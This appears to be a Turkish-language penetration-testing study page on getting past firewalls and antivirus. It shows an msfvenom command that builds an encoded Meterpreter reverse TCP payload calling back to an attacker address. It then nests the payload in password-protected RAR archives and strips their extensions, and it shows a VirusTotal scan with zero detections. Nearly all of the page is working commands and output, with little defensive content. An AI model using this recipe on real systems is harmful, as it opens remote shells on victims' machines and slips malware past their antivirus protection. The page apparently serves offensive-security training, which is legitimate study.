---
glightbox: true
icon: material/circle-small
---

# Firewall and IDS/IPS Evasion

## Generating Payload

```bash
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=10.10.14.2 LPORT=8080 -k -e x86/shikata_ga_nai -a x86 --platform windows -o ~/test.js -i 5
```

```text title="Output"
Attempting to read payload from STDIN...
Found 1 compatible encoders
Attempting to encode payload with 5 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 27 (iteration=0)
x86/shikata_ga_nai succeeded with size 54 (iteration=1)
x86/shikata_ga_nai succeeded with size 81 (iteration=2)
x86/shikata_ga_nai succeeded with size 108 (iteration=3)
x86/shikata_ga_nai succeeded with size 135 (iteration=4)
x86/shikata_ga_nai chosen with final size 135
Payload size: 135 bytes
Saved as: /home/user/test.js
```

## Archiving the Payload

Bir dosya, klasör, komut dosyası, yürütülebilir dosya, resim veya belge gibi bir bilgiyi arşivlemek ve arşive bir parola koymak pek çok yaygın anti-virüs imzalamasını atlar. Ancak bu işlemin dezavantajı, parola ile kilitlenmeleri nedeniyle anti-virüs yazılımları bu dosyaları tarayamaz ve kontrol panelinde bu durumu kullanıcıya bildirir. Yönetici, kötü amaçlı olup olmadıklarını belirlemek için bu arşivleri el ile incelemeyi seçebilir.

Daha önceden oluşturulan payload dosyasını iki kez arşivleyeceğiz ve arşiv uzantısını kaldıracağız. Bunun için [RAR](https://www.rarlab.com/download.htm) programını kullanacağız:

```bash
wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
tar -xzvf rarlinux-x64-612.tar.gz
cd rar
rar a ~/test.rar -p ~/test.js
```

```text title="Output"
Enter password (will not be echoed): ******
Reenter password: ******

RAR 5.50   Copyright (c) 1993-2017 Alexander Roshal   11 Aug 2017
Trial version             Type 'rar -?' for help
Evaluation copy. Please register.

Creating archive test.rar
Adding    test.js                                                     OK
Done
```

Uzantıyı dosyadan kaldır:

```bash
mv test.rar test
```

Arşiv dosyasını tekrar arşivle:

```bash
rar a test2.rar -p test
```

```text title="Output"
Enter password (will not be echoed): ******
Reenter password: ******

RAR 5.50   Copyright (c) 1993-2017 Alexander Roshal   11 Aug 2017
Trial version             Type 'rar -?' for help
Evaluation copy. Please register.

Creating archive test2.rar
Adding    test                                                        OK
Done
```

Uzantıyı dosyadan kaldır:

```bash
mv test2.rar test2
```

## VirusTotal

```bash
msf-virustotal -k <API key> -f test2
```

```text title="Output" hl_lines="15"
[*] Using API key: <API key>
[*] Please wait while I upload test2...
[*] VirusTotal: Scan request successfully queued, come back later for the report
[*] Sample MD5 hash    : 2f25eeeea28f737917e59177be61be6d
[*] Sample SHA1 hash   : c31d7f02cfadd87c430c2eadf77f287db4701429
[*] Sample SHA256 hash : 76ec64197aa2ac203a5faa303db94f530802462e37b6e1128377315a93d1c2ad
[*] Analysis link: https://www.virustotal.com/gui/file/...SNIP.../detection/f-...SNIP...-1652167804
[*] Requesting the report...
[*] Received code 0. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Received code -2. Waiting for another 60 seconds...
[*] Analysis Report: test2 (0 / 49): 76ec64197aa2ac203a5faa303db94f530802462e37b6e1128377315a93d1c2ad
=================================================================================================

 Antivirus             Detected  Version         Result  Update
 ---------             --------  -------         ------  ------
 ALYac                 false     1.1.3.1                 20220510
 Acronis               false     1.2.0.108               20220426
 Ad-Aware              false     3.0.21.193              20220510
 AhnLab-V3             false     3.21.3.10230            20220510
 Antiy-AVL             false     3.0                     20220510
 Arcabit               false     1.0.0.889               20220510
 Avira                 false     8.3.3.14                20220510
 BitDefender           false     7.2                     20220510
 BitDefenderTheta      false     7.2.37796.0             20220428
 Bkav                  false     1.3.0.9899              20220509
 CAT-QuickHeal         false     14.00                   20220510
 CMC                   false     2.10.2019.1             20211026
 ClamAV                false     0.105.0.0               20220509
 Comodo                false     34606                   20220509
 Cynet                 false     4.0.0.27                20220510
 Cyren                 false     6.5.1.2                 20220510
 DrWeb                 false     7.0.56.4040             20220510
 ESET-NOD32            false     25243                   20220510
 Emsisoft              false     2021.5.0.7597           20220510
 F-Secure              false     18.10.978.51            20220510
 FireEye               false     35.24.1.0               20220510
 Fortinet              false     6.2.142.0               20220510
 Gridinsoft            false     1.0.77.174              20220510
 Jiangmin              false     16.0.100                20220509
 K7AntiVirus           false     12.12.42275             20220510
 K7GW                  false     12.12.42275             20220510
 Kingsoft              false     2017.9.26.565           20220510
 Lionic                false     7.5                     20220510
 MAX                   false     2019.9.16.1             20220510
 Malwarebytes          false     4.2.2.27                20220510
 MaxSecure             false     1.0.0.1                 20220510
 McAfee-GW-Edition     false     v2019.1.2+3728          20220510
 MicroWorld-eScan      false     14.0.409.0              20220510
 NANO-Antivirus        false     1.0.146.25588           20220510
 Panda                 false     4.6.4.2                 20220509
 Rising                false     25.0.0.27               20220510
 SUPERAntiSpyware      false     5.6.0.1032              20220507
 Sangfor               false     2.14.0.0                20220507
 Symantec              false     1.17.0.0                20220510
 TACHYON               false     2022-05-10.02           20220510
 Tencent               false     1.0.0.1                 20220510
 TrendMicro-HouseCall  false     10.0.0.1040             20220510
 VBA32                 false     5.0.0                   20220506
 ViRobot               false     2014.3.20.0             20220510
 VirIT                 false     9.5.191                 20220509
 Yandex                false     5.5.2.24                20220428
 Zillya                false     2.0.0.4627              20220509
 ZoneAlarm             false     1.0                     20220510
 Zoner                 false     2.2.2.0                 20220509
```
